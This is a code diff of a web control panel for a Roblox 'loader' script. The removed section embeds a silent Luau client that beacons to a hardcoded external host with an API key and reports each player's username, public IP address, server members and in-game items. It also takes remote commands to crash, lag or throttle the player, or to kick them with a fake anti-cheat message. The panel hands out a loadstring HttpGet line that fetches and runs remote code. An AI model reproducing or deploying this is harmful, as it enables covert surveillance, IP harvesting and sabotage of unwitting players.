+        .loader-modal .modal-actions .btn { padding: 6px 20px; border-radius: 30px; border: none; font-weight: 600; font-size: 13px; cursor: pointer; transition: all 0.2s; background: #1f2a36; color: #c8d2df; border: 1px solid #2a3646; }
+        .loader-modal .modal-actions .btn-primary { background: #6366f1; border-color: #818cf8; color: #fff; }
+        .loader-modal .modal-actions .btn-primary:hover { background: #818cf8; }
+        .loader-modal .modal-actions .btn:hover { background: #2a3646; }
     </style>
-<base target="_blank">
-<base target="_blank">
 </head>
 <body>
 
-<!-- LOGIN SCREEN -->
-<div id="loginScreen">
-    <div class="login-box">
-        <h1>🔒 Control Panel</h1>
-        <p>Enter the panel password to continue</p>
-        <input type="password" id="loginPassword" placeholder="Password" onkeydown="if(event.key==='Enter')doLogin()">
-        <button onclick="doLogin()">Unlock</button>
-        <div class="login-error" id="loginError">Wrong password. Try again.</div>
-    </div>
-</div>
-
-
 <div class="toast" id="toast"></div>
-
-<div class="modal-overlay" id="loaderModal">
-    <div class="modal">
-        <h3>📋 Copy Loader</h3>
-        <p class="sub">Paste this into any Roblox executor.</p>
-        <div class="code-display" id="loaderCodeDisplay" onclick="copyLoaderCode()">
+<div class="loader-modal-overlay" id="loaderModal">
+    <div class="loader-modal">
+        <h3>Copy Loader</h3>
+        <p class="sub">Paste this into any executor.</p>
+        <div class="code-block" id="loaderCodeBlock">
             <span class="copy-hint">click to copy</span>
             <span id="loaderCodeText"></span>
         </div>
         <div class="modal-actions">
-            <button class="modal-btn" onclick="closeLoaderModal()">Close</button>
-            <button class="modal-btn primary" onclick="copyLoaderCode()">Copy</button>
+            <button class="btn" onclick="closeLoaderModal()">Close</button>
+            <button class="btn btn-primary" id="copyLoaderBtn">Copy</button>
         </div>
     </div>
 </div>
 
-<header class="header">
-    <div class="header-left">
-        <div class="status-dot"></div>
-        <span class="header-title">Control Panel</span>
-        <span class="header-stats"><span id="onlineCount">0</span> active</span>
-    </div>
-    <div class="header-right">
-        <button class="btn-header" onclick="showTab('ipbans')">IP Bans</button>
-        <button class="btn-header accent" onclick="showTab('admin')">Admin Only Panel</button>
-        <div class="user-badge">
-            <span>ALAMEEN ONLY BOY</span>
-            <span class="signout" onclick="signOut()">Sign out</span>
+<div class="app">
+    <header class="header">
+        <div class="header-left">
+            <span class="logo">Xeno Panel</span>
+            <span class="logo-sub">v3</span>
         </div>
-    </div>
-</header>
-
-<div class="main">
-    <div class="left-panel">
-        <div class="panel-section">
-            <div class="panel-section-header">
-                <h3>📝 Luau Loader</h3>
-                <button class="copy-btn" onclick="copyFullLoader()">
-                    <span>📋</span> Copy
-                </button>
-            </div>
-            <div class="config-row">
-                <input type="text" id="panelUrl" placeholder="Panel URL (e.g. https://yourpanel.lovable.app)">
-                <input type="text" id="apiKey" placeholder="API Key">
-                <button onclick="updateLoader()">Update</button>
-            </div>
-            <div class="code-block" id="loaderCodeBlock">
--- Configure your Panel URL and API Key above, then click Update
-            </div>
-        </div>
-
-        <div class="panel-section chat-section">
-            <div class="chat-header">
-                <h3>💬 Chat</h3>
-                <span class="count" id="chatCount">0</span>
-            </div>
-            <div class="chat-messages" id="chatMessages"></div>
-        </div>
-    </div>
-
-    <div class="right-panel">
-        <div class="tabs">
-            <button class="tab active" onclick="switchTab('active')" id="tabActive">
-                Active Players <span class="count" id="activeCount">(0)</span>
+        <div class="header-actions">
+            <button class="copy-loader-btn" onclick="openLoaderModal()">
+                <span class="icon">📋</span> Copy loader
             </button>
-            <button class="tab" onclick="switchTab('past')" id="tabPast">
-                Past Players <span class="count" id="pastCount">(0)</span>
-            </button>
-            <button class="tab" onclick="switchTab('hidden')" id="tabHidden">
-                Hidden People <span class="count" id="hiddenCount">(0)</span>
-            </button>
-        </div>
-
-        <div class="toolbar">
-            <div class="search-box">
-                <input type="text" id="searchInput" placeholder="Search by name, id, game, or brainrot..." oninput="handleSearch()">
-            </div>
-            <div class="toolbar-actions">
-                <button class="toolbar-btn" onclick="clearPastPlayers()">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
-                    Clear Past
-                </button>
-                <button class="toolbar-btn" onclick="downloadData()">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-                    Download
-                </button>
-                <button class="toolbar-btn" onclick="showBrainrotFilter()">
-                    All Brainrots
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px"><path d="M6 9l6 6 6-6"/></svg>
-                </button>
+            <div class="header-stats">
+                <span>🟢 <span class="num" id="onlineCount">0</span> online</span>
+                <span>⏱ <span class="num" id="refreshTimer">1s</span></span>
             </div>
         </div>
+    </header>
 
-        <div style="margin-bottom: 16px;">
-            <input type="text" id="minMsFilter" placeholder="Min M/s (1B = 1000M)" style="padding: 8px 14px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 13px; width: 200px; outline: none;">
-        </div>
-
-        <div id="playerList">
-            <div class="empty-state">
-                <div class="icon">📡</div>
-                <h3>Waiting for clients...</h3>
-                <p>Configure the panel URL & API Key, then execute the loader script to see players appear.</p>
+    <div class="main">
+        <section class="players-section">
+            <div class="section-header">
+                <h2>👥 Players <span class="badge" id="totalBadge">0</span></h2>
+                <span class="last-update" id="lastUpdate">updating…</span>
             </div>
-        </div>
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="Search by username, display name, or brainrot..." />
+            </div>
+            <div class="player-grid" id="playerGrid">
+                <div class="empty-state">
+                    <div class="icon">📡</div>
+                    <p>Waiting for clients…</p>
+                    <p class="sub">Execute the loader script to see players appear.</p>
+                </div>
+            </div>
+        </section>
+
+        <aside class="command-panel" id="commandPanel">
+            <div class="panel-title">🎮 Control <span class="target-name" id="targetName">—</span></div>
+            <div class="panel-sub"><span id="targetStatus">No player selected</span></div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Performance</span>
+                <div class="cmd-row">
+                    <div class="toggle-wrap disabled" id="toggleFps" data-cmd="fps_limit">
+                        <span class="label">FPS Limit</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Lag Engine</span>
+                <div class="cmd-row">
+                    <div class="toggle-wrap disabled" id="toggleLagN" data-cmd="lag_n">
+                        <span class="label">Lag (Normal)</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                    <div class="toggle-wrap disabled" id="toggleLagC" data-cmd="lag_c">
+                        <span class="label">Lag (Carry)</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Actions</span>
+                <div class="cmd-btn-group">
+                    <button class="cmd-btn danger" id="btnKick" disabled>Kick</button>
+                    <button class="cmd-btn warning" id="btnCrash" disabled>Crash</button>
+                </div>
+            </div>
+
+            <div class="brainrot-section" id="brainrotSection">
+                <div class="brainrot-label">
+                    <span>🧠 BRAINROTS</span>
+                    <span class="count" id="brainrotCount">0 items</span>
+                </div>
+                <div class="brainrot-list" id="brainrotList">
+                    <div class="brainrot-empty">Select a player to see brainrots</div>
+                </div>
+            </div>
+        </aside>
     </div>
 </div>
 
 <script>
-const LOADER_TEMPLATE = `--[[
-  Panel Client v3 — fully silent, no GUI, no prints
-  Controlled exclusively via web panel polling.
-]]
-local BASE = "https://roblox-panel-4h3i.onrender.com"
-local KEY  = "aggredireontopstupidnga"
+    const API_BASE = window.location.origin;
+    const POLL_INTERVAL = 1000;
 
-local Players            = game:GetService("Players")
-local HttpService        = game:GetService("HttpService")
-local RunService         = game:GetService("RunService")
-local MarketplaceService = game:GetService("MarketplaceService")
+    let players = new Map();
+    let selectedUserId = null;
+    let commandState = { fps_limit: false, lag_n: false, lag_c: false };
+    let toastTimeout = null;
+    let searchQuery = '';
 
--- ═══════════════════════════════════════════════════════════
--- ROBUST BOOTSTRAP — works with raw execution AND whitelist
--- loaders (Luarmor, etc.) that may run the script in a
--- sandboxed env or before LocalPlayer/request is ready.
--- ═══════════════════════════════════════════════════════════
-local genv = (getgenv and getgenv()) or _G or {}
+    const $ = (s) => document.querySelector(s);
+    const $$ = (s) => document.querySelectorAll(s);
 
--- Resolve the HTTP request function across executors & sandboxes.
-local function resolveRequest()
-    return http_request
-        or request
-        or (syn and syn.request)
-        or (http and http.request)
-        or (fluxus and fluxus.request)
-        or genv.http_request
-        or genv.request
-        or (genv.syn and genv.syn.request)
-end
+    const playerGrid = $('#playerGrid');
+    const onlineCount = $('#onlineCount');
+    const totalBadge = $('#totalBadge');
+    const lastUpdate = $('#lastUpdate');
+    const refreshTimer = $('#refreshTimer');
+    const targetName = $('#targetName');
+    const targetStatus = $('#targetStatus');
+    const toggleFps = $('#toggleFps');
+    const toggleLagN = $('#toggleLagN');
+    const toggleLagC = $('#toggleLagC');
+    const btnKick = $('#btnKick');
+    const btnCrash = $('#btnCrash');
+    const brainrotList = $('#brainrotList');
+    const brainrotCount = $('#brainrotCount');
+    const toast = $('#toast');
+    const searchInput = $('#searchInput');
 
--- Retry resolution for a few seconds — under loaders the executor
--- globals are sometimes injected a tick or two after the script starts.
-local request = resolveRequest()
-if not request then
-    local deadline = tick() + 10
-    repeat
-        task.wait(0.25)
-        request = resolveRequest()
-    until request or tick() > deadline
-end
-if not request then return end
-
--- Acquire LocalPlayer by polling. Do NOT use PlayerAdded:Wait():
--- when a loader runs after the player already joined, that event
--- never fires again and the whole script would hang forever.
-local LP = Players.LocalPlayer
-if not LP then
-    local deadline = tick() + 30
-    repeat
-        task.wait(0.1)
-        LP = Players.LocalPlayer
-    until LP or tick() > deadline
-end
-if not LP then return end
-
-local function safe(fn)
-    local ok, res = pcall(fn)
-    if ok then return res end
-    return nil
-end
-
-local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
-
-local function gameName()
-    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
-    if info and info.Name then return info.Name end
-    return "Unknown Game"
-end
-
-local function avatarUrl()
-    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
-end
-
-local function serverPlayers()
-    local t = {}
-    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
-    return t
-end
-
--- Resolve the player's public IP address once and cache it. Uses a plain-text
--- IP endpoint so we don't need JSON parsing. Best-effort: returns "" on failure.
-local cachedIp = nil
-local function publicIp()
-    if cachedIp ~= nil then return cachedIp end
-    cachedIp = ""
-    local res = safe(function()
-        return request({ Url = "https://api.ipify.org", Method = "GET" })
-    end)
-    if res and res.Body then
-        local ip = tostring(res.Body):gsub("%s+", "")
-        if string.match(ip, "^[%d%.:%a]+\$") and #ip >= 3 and #ip <= 60 then
-            cachedIp = ip
-        end
-    end
-    return cachedIp
-end
-
-local function collectBrainrots()
-    local list = {}
-    -- NEVER use WaitForChild here: under whitelist loaders the script can run
-    -- before PlayerGui has replicated, and WaitForChild would yield forever,
-    -- blocking the heartbeat so the player never appears in the panel.
-    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
-    if not pg then return list end
-    local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
-    if not gui then return list end
-    local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end)
-    if not frame then return list end
-    local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
-    if not scroll then return list end
-
-    for _, template in ipairs(scroll:GetChildren()) do
-        if template.Name == "Template" then
-            local cash, title = nil, nil
-            for _, obj in ipairs(template:GetDescendants()) do
-                if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
-                    local text = obj.Text
-                    if string.find(text, "Cookie") or string.find(text, "Milki")
-                       or string.find(text, "%\$")
-                       or (string.match(text, "^%d+\$") and tonumber(text) > 100) then
-                        cash = text
-                    end
-                    if not string.match(text, "^%d+\$")
-                       and not string.find(text, "Template")
-                       and not string.find(text, "Cookie")
-                       and not string.find(text, "Milki")
-                       and string.len(text) > 3 then
-                        if not title or string.len(text) > string.len(title) then
-                            title = text
-                        end
-                    end
-                end
-            end
-            if cash or title then
-                list[#list+1] = { title = title or "Unknown", cash = cash or "Unknown" }
-            end
-        end
-    end
-
-    return list
-end
-
--- ═══════════════════════════════════════════════════════════
--- HEARTBEAT — reports player info to the web panel
--- ═══════════════════════════════════════════════════════════
-local function heartbeat()
-    safe(function()
-        request({
-            Url = BASE .. "/api/public/heartbeat",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-            Body = HttpService:JSONEncode({
-                user_id        = LP.UserId,
-                username       = LP.Name,
-                display_name   = LP.DisplayName,
-                avatar_url     = avatarUrl(),
-                place_id       = game.PlaceId,
-                game_name      = gameName(),
-                job_id         = game.JobId,
-                executor       = executorName,
-                server_players = serverPlayers(),
-                ip_address     = publicIp(),
-                brainrots      = collectBrainrots(),
-            }),
-        })
-    end)
-end
-
--- ═══════════════════════════════════════════════════════════
--- FPS LIMITER
--- ═══════════════════════════════════════════════════════════
-local fpsConn = nil
-local fpsOn = false
-local function setFpsLimit(on)
-    if on == fpsOn then return end
-    fpsOn = on
-    if on then
-        fpsConn = RunService.RenderStepped:Connect(function()
-            local t = tick()
-            while tick() - t < 0.95 do end
-        end)
-    else
-        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
-    end
-end
-
--- ═══════════════════════════════════════════════════════════
--- RUBBERBAND LAG ENGINE
--- Straight from the reference source — drives Lag N & Lag C
--- ═══════════════════════════════════════════════════════════
-local HISTORY_SIZE     = 0.27
-local INTERVAL         = 0.6
-local NORMAL_SPEED_MIN = 35
-local CARRY_SPEED_MIN  = 17
-
-local posHistory     = {}
-local isActive       = false
-local mode           = nil   -- nil | "normal" | "carry"
-local intervalThread = nil
-
--- Continuously record root CFrame for rollback
-RunService.Heartbeat:Connect(function()
-    local char = LP.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    if not root then return end
-    local now = tick()
-    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
-    -- Trim old entries
-    local cutoff = now - HISTORY_SIZE - 0.1
-    while #posHistory > 0 and posHistory[1].time < cutoff do
-        table.remove(posHistory, 1)
-    end
-end)
-
-local function currentSpeed()
-    local char = LP.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    if not root then return 0 end
-    local v = root.AssemblyLinearVelocity
-    return Vector3.new(v.X, 0, v.Z).Magnitude
-end
-
-local function meetsSpeedReq()
-    local s = currentSpeed()
-    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
-    if mode == "carry"  then return s >= CARRY_SPEED_MIN  end
-    return false
-end
-
-local function doRubberband()
-    local char = LP.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    if not root then return end
-
-    local vel = root.AssemblyLinearVelocity
-    local horizVel = Vector3.new(vel.X, 0, vel.Z)
-    if horizVel.Magnitude < 1 then return end
-
-    local targetTime = tick() - HISTORY_SIZE
-    local best = nil
-    for i = 1, #posHistory do
-        if posHistory[i].time >= targetTime then
-            best = posHistory[i].cframe
-            break
-        end
-    end
-    if not best then return end
-
-    root.CFrame = best
-    root.AssemblyLinearVelocity = vel
-end
-
-local function stopLoop()
-    if intervalThread then
-        pcall(task.cancel, intervalThread)
-        intervalThread = nil
-    end
-end
-
-local function startLoop()
-    stopLoop()
-    intervalThread = task.spawn(function()
-        local startTime = tick()
-        local iteration = 0
-        while isActive do
-            while isActive and not meetsSpeedReq() do
-                task.wait(0.05)
-            end
-            if not isActive then break end
-            iteration = iteration + 1
-            local targetT = startTime + (iteration * INTERVAL)
-            local sleepT = targetT - tick()
-            if sleepT > 0 then task.wait(sleepT) end
-            if isActive and meetsSpeedReq() then
-                doRubberband()
-            end
-        end
-    end)
-end
-
-local function setMode(newMode)
-    if mode == newMode then return end
-    mode = newMode
-    if mode then
-        isActive = true
-        startLoop()
-    else
-        isActive = false
-        stopLoop()
-    end
-end
-
--- ═══════════════════════════════════════════════════════════
--- WEB PANEL POLL — commands from the control panel override
--- local state silently. Runs every 0.5s.
--- ═══════════════════════════════════════════════════════════
-local kicked = false
-local prevLagN = false
-local prevLagC = false
-local prevFps  = false
-
-local function poll()
-    local res = safe(function()
-        return request({
-            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
-            Method = "GET",
-            Headers = { ["X-Api-Key"] = KEY },
-        })
-    end)
-    if not res or not res.Body then return end
-    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
-    if not ok2 or type(data) ~= "table" then return end
-
-    -- FPS limit from web panel
-    local wantFps = (data.fps_limit == true)
-    if wantFps ~= prevFps then
-        prevFps = wantFps
-        setFpsLimit(wantFps)
-    end
-
-    -- Lag mode from web panel
-    local wantN = (data.lag_n == true)
-    local wantC = (data.lag_c == true)
-    if wantC ~= prevLagC or wantN ~= prevLagN then
-        prevLagC = wantC
-        prevLagN = wantN
-        if wantC then
-            setMode("carry")
-        elseif wantN then
-            setMode("normal")
-        else
-            setMode(nil)
-        end
-    end
-
-    -- One-shot commands
-    if data.crash == true then
-        while true do end
-    end
-    if data.kick == true and not kicked then
-        kicked = true
-        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
-    end
-end
-
--- ═══════════════════════════════════════════════════════════
--- MAIN LOOPS
--- ═══════════════════════════════════════════════════════════
-heartbeat()
-poll()
-
-task.spawn(function()
-    while task.wait(5) do
-        heartbeat()
-    end
-end)
-
-task.spawn(function()
-    while task.wait(5) do
-        poll()
-    end
-end)
-`;
-
-let currentLoaderCode = '';
-let players = new Map();
-let pastPlayers = new Map();
-let hiddenPlayers = new Map();
-let selectedUserId = null;
-let currentTab = 'active';
-let searchQuery = '';
-let commandStates = new Map();
-let toastTimeout = null;
-let panelUrl = '';
-let apiKey = '';
-let pollInterval = null;
-
-function showToast(msg, type = 'info') {
-    const toast = document.getElementById('toast');
-    if (toastTimeout) clearTimeout(toastTimeout);
-    toast.textContent = msg;
-    toast.className = 'toast ' + type;
-    toast.classList.add('show');
-    toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
-}
-
-function formatCash(cash) {
-    if (!cash) return '?';
-    const num = parseFloat(cash.toString().replace(/[^0-9.]/g, ''));
-    if (isNaN(num)) return cash;
-    if (num >= 1e9) return (num / 1e9).toFixed(1) + 'B';
-    if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
-    if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
-    return num.toString();
-}
-
-function formatTimeAgo(timestamp) {
-    const diff = Date.now() - timestamp;
-    const seconds = Math.floor(diff / 1000);
-    if (seconds < 60) return seconds + 's ago';
-    const minutes = Math.floor(seconds / 60);
-    if (minutes < 60) return minutes + 'm ago';
-    const hours = Math.floor(minutes / 60);
-    if (hours < 24) return hours + 'h ago';
-    const days = Math.floor(hours / 24);
-    return days + 'd ago';
-}
-
-function updateLoader() {
-    panelUrl = document.getElementById('panelUrl').value.trim();
-    apiKey = document.getElementById('apiKey').value.trim();
-    if (!panelUrl) { showToast('Enter your panel URL first', 'error'); return; }
-    if (!apiKey) { showToast('Enter your API key first', 'error'); return; }
-    panelUrl = panelUrl.replace(/\/$/, '');
-    currentLoaderCode = LOADER_TEMPLATE
-        .replace('{{PANEL_URL}}', panelUrl)
-        .replace('{{API_KEY}}', apiKey);
-    document.getElementById('loaderCodeBlock').textContent = currentLoaderCode;
-    showToast('Loader updated! Copy and execute in Roblox.', 'success');
-    startPolling();
-}
-
-function getLoadstring() {
-    if (!currentLoaderCode) { showToast('Update the loader first!', 'error'); return ''; }
-    return `loadstring(game:HttpGet("${panelUrl}/loader.lua"))()`;
-}
-
-function openLoaderModal() {
-    const ls = getLoadstring();
-    if (!ls) return;
-    document.getElementById('loaderCodeText').textContent = ls;
-    document.getElementById('loaderModal').classList.add('open');
-}
-
-function closeLoaderModal() {
-    document.getElementById('loaderModal').classList.remove('open');
-}
-
-function copyLoaderCode() {
-    const text = document.getElementById('loaderCodeText').textContent;
-    if (!text) { showToast('Nothing to copy', 'error'); return; }
-    navigator.clipboard.writeText(text).then(() => {
-        showToast('Loadstring copied!', 'success');
-        closeLoaderModal();
-    }).catch(() => { showToast('Failed to copy', 'error'); });
-}
-
-function copyFullLoader() {
-    if (!currentLoaderCode) { showToast('Update the loader first (set URL + Key)', 'error'); return; }
-    navigator.clipboard.writeText(currentLoaderCode).then(() => {
-        showToast('Full loader copied!', 'success');
-    }).catch(() => { showToast('Failed to copy', 'error'); });
-}
-
-function switchTab(tab) {
-    currentTab = tab;
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
-    selectedUserId = null;
-    renderPlayers();
-}
-
-function showTab(tab) {
-    showToast(tab === 'ipbans' ? 'IP Bans panel coming soon' : 'Admin panel coming soon', 'info');
-}
-
-function signOut() { showToast('Signed out', 'info'); }
-
-function handleSearch() {
-    searchQuery = document.getElementById('searchInput').value.toLowerCase();
-    renderPlayers();
-}
-
-function getDisplayList() {
-    let list = [];
-    if (currentTab === 'active') {
-        list = Array.from(players.values()).filter(p => p.online);
-    } else if (currentTab === 'past') {
-        list = Array.from(pastPlayers.values());
-    } else if (currentTab === 'hidden') {
-        list = Array.from(hiddenPlayers.values());
+    function showToast(msg, icon = '✓') {
+        if (toastTimeout) clearTimeout(toastTimeout);
+        toast.innerHTML = `<span class="toast-icon">${icon}</span> ${msg}`;
+        toast.classList.add('show');
+        toastTimeout = setTimeout(() => toast.classList.remove('show'), 2800);
     }
-    if (searchQuery) {
-        list = list.filter(p => {
-            const matchName = (p.username || '').toLowerCase().includes(searchQuery);
-            const matchDisplay = (p.display_name || '').toLowerCase().includes(searchQuery);
-            const matchId = (p.user_id || '').toString().includes(searchQuery);
-            const matchGame = (p.game_name || '').toLowerCase().includes(searchQuery);
-            const matchBrainrot = (p.brainrots || []).some(b => (b.title || '').toLowerCase().includes(searchQuery));
-            return matchName || matchDisplay || matchId || matchGame || matchBrainrot;
+
+    function openLoaderModal() {
+        const modal = $('#loaderModal');
+        const loaderUrl = API_BASE + '/loader.lua';
+        document.getElementById('loaderCodeText').textContent = `loadstring(game:HttpGet("${loaderUrl}"))()`;
+        modal.classList.add('open');
+    }
+    function closeLoaderModal() { $('#loaderModal').classList.remove('open'); }
+    $('#loaderModal').addEventListener('click', function(e) { if (e.target === this) closeLoaderModal(); });
+    $('#copyLoaderBtn').addEventListener('click', function() {
+        const text = document.getElementById('loaderCodeText').textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Loader code copied!', '📋');
+            closeLoaderModal();
+        }).catch(() => {
+            const range = document.createRange();
+            const sel = window.getSelection();
+            const el = document.getElementById('loaderCodeText');
+            range.selectNodeContents(el);
+            sel.removeAllRanges();
+            sel.addRange(range);
+            document.execCommand('copy');
+            showToast('Loader code copied!', '📋');
+            closeLoaderModal();
+        });
+    });
+    document.getElementById('loaderCodeBlock').addEventListener('click', function() {
+        document.getElementById('copyLoaderBtn').click();
+    });
+
+    async function fetchPlayers() {
+        try {
+            const res = await fetch(API_BASE + '/api/players');
+            if (!res.ok) throw new Error('Server error');
+            const data = await res.json();
+            return data.players || [];
+        } catch (e) { return []; }
+    }
+
+    async function sendCommand(userId, payload) {
+        try {
+            const res = await fetch(API_BASE + '/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, ...payload })
+            });
+            if (!res.ok) throw new Error('Command failed');
+            return await res.json();
+        } catch (e) {
+            showToast('Command failed: ' + e.message, '✗');
+            return null;
+        }
+    }
+
+    function renderPlayers() {
+        const entries = Array.from(players.values());
+        let filtered = entries;
+        if (searchQuery.trim() !== '') {
+            const q = searchQuery.trim().toLowerCase();
+            filtered = entries.filter(p => {
+                const matchUsername = p.username && p.username.toLowerCase().includes(q);
+                const matchDisplay = p.display_name && p.display_name.toLowerCase().includes(q);
+                const matchBrainrot = p.brainrots && p.brainrots.some(b => b.title && b.title.toLowerCase().includes(q));
+                return matchUsername || matchDisplay || matchBrainrot;
+            });
+        }
+
+        const online = filtered.filter(p => p.online);
+        const offline = filtered.filter(p => !p.online);
+
+        onlineCount.textContent = online.length;
+        totalBadge.textContent = entries.length;
+
+        if (filtered.length === 0) {
+            playerGrid.innerHTML = `<div class="empty-state"><div class="icon">🔍</div><p>No players match your search</p><p class="sub">Try a different keyword</p></div>`;
+            return;
+        }
+
+        const sorted = [...online, ...offline];
+        let html = '';
+        for (const p of sorted) {
+            const isSelected = (p.user_id === selectedUserId);
+            const statusClass = p.online ? 'online' : 'offline';
+            const avatarUrl = p.avatar_url || '';
+            const initial = (p.username || '?')[0].toUpperCase();
+            html += `<div class="player-card ${statusClass} ${isSelected ? 'selected' : ''}" data-userid="${p.user_id}" onclick="selectPlayer('${p.user_id}')">
+                <div class="player-avatar">${avatarUrl ? `<img src="${avatarUrl}" alt="${p.username}" loading="lazy" onerror="this.style.display='none'" />` : ''}<div class="fallback" style="${avatarUrl ? 'display:none' : ''}">${initial}</div></div>
+                <div class="player-info"><div class="player-name">${p.username || 'Unknown'}</div><div class="player-meta"><span class="tag">${p.executor || '?'}</span><span class="tag">${p.game_name ? p.game_name.substring(0, 14) : '?'}</span></div></div>
+                <div class="player-status ${p.online ? '' : 'offline'}"></div>
+            </div>`;
+        }
+        playerGrid.innerHTML = html;
+        updateCommandPanel();
+    }
+
+    function updateCommandPanel() {
+        const selected = selectedUserId ? players.get(selectedUserId) : null;
+        if (selected && selected.online) {
+            targetName.textContent = selected.username || 'Player';
+            targetStatus.textContent = '🟢 Online · ' + (selected.executor || 'unknown');
+            targetStatus.style.color = '#86efac';
+            toggleFps.classList.remove('disabled');
+            toggleLagN.classList.remove('disabled');
+            toggleLagC.classList.remove('disabled');
+            btnKick.disabled = false;
+            btnCrash.disabled = false;
+            setToggleState(toggleFps, commandState.fps_limit || false);
+            setToggleState(toggleLagN, commandState.lag_n || false);
+            setToggleState(toggleLagC, commandState.lag_c || false);
+            renderBrainrots(selected.brainrots || []);
+        } else if (selected && !selected.online) {
+            targetName.textContent = selected.username || 'Player';
+            targetStatus.textContent = '⛔ Offline';
+            targetStatus.style.color = '#6b7a8f';
+            toggleFps.classList.add('disabled');
+            toggleLagN.classList.add('disabled');
+            toggleLagC.classList.add('disabled');
+            btnKick.disabled = true;
+            btnCrash.disabled = true;
+            renderBrainrots(selected.brainrots || []);
+        } else {
+            targetName.textContent = '—';
+            targetStatus.textContent = 'No player selected';
+            targetStatus.style.color = '#6b7a8f';
+            toggleFps.classList.add('disabled');
+            toggleLagN.classList.add('disabled');
+            toggleLagC.classList.add('disabled');
+            btnKick.disabled = true;
+            btnCrash.disabled = true;
+            renderBrainrots([]);
+        }
+    }
+
+    function setToggleState(el, active) {
+        if (active) {
+            el.classList.add('active');
+            el.querySelector('.status-text').textContent = 'ON';
+        } else {
+            el.classList.remove('active');
+            el.querySelector('.status-text').textContent = 'OFF';
+        }
+    }
+
+    function renderBrainrots(brainrots) {
+        brainrotCount.textContent = (brainrots.length || 0) + ' items';
+        if (!brainrots || brainrots.length === 0) {
+            brainrotList.innerHTML = `<div class="brainrot-empty">No brainrots found</div>`;
+            return;
+        }
+        let html = '';
+        for (const b of brainrots) {
+            html += `<div class="brainrot-item"><span class="title">${b.title || 'Unknown'}</span><span class="cash">${b.cash || '?'}</span></div>`;
+        }
+        brainrotList.innerHTML = html;
+    }
+
+    function selectPlayer(userId) {
+        selectedUserId = userId;
+        fetchPlayerCommandState(userId);
+        renderPlayers();
+        updateCommandPanel();
+    }
+
+    async function fetchPlayerCommandState(userId) {
+        try {
+            const res = await fetch(API_BASE + '/api/command_state?user_id=' + encodeURIComponent(userId));
+            if (!res.ok) return;
+            const data = await res.json();
+            if (data) {
+                commandState.fps_limit = data.fps_limit || false;
+                commandState.lag_n = data.lag_n || false;
+                commandState.lag_c = data.lag_c || false;
+                updateCommandPanel();
+            }
+        } catch (e) { /* ignore */ }
+    }
+
+    function setupToggle(el, cmdKey) {
+        el.addEventListener('click', function(e) {
+            if (this.classList.contains('disabled')) return;
+            if (!selectedUserId) { showToast('Select a player first', '⚠️'); return; }
+            const player = players.get(selectedUserId);
+            if (!player || !player.online) { showToast('Player is offline', '⚠️'); return; }
+            const current = commandState[cmdKey] || false;
+            const newState = !current;
+            commandState[cmdKey] = newState;
+            setToggleState(this, newState);
+            const payload = {};
+            payload[cmdKey] = newState;
+            sendCommand(selectedUserId, payload).then(() => {
+                showToast(`${cmdKey} → ${newState ? 'ON' : 'OFF'}`, '✓');
+            }).catch(() => {
+                commandState[cmdKey] = current;
+                setToggleState(this, current);
+            });
         });
     }
-    return list;
-}
 
-function selectPlayer(userId) {
-    if (selectedUserId === userId) { selectedUserId = null; }
-    else { selectedUserId = userId; }
-    renderPlayers();
-}
+    setupToggle(toggleFps, 'fps_limit');
+    setupToggle(toggleLagN, 'lag_n');
+    setupToggle(toggleLagC, 'lag_c');
 
-function hidePlayer(userId, e) {
-    e.stopPropagation();
-    const player = players.get(userId) || pastPlayers.get(userId);
-    if (player) {
-        hiddenPlayers.set(userId, { ...player, hiddenAt: Date.now() });
-        players.delete(userId);
-        pastPlayers.delete(userId);
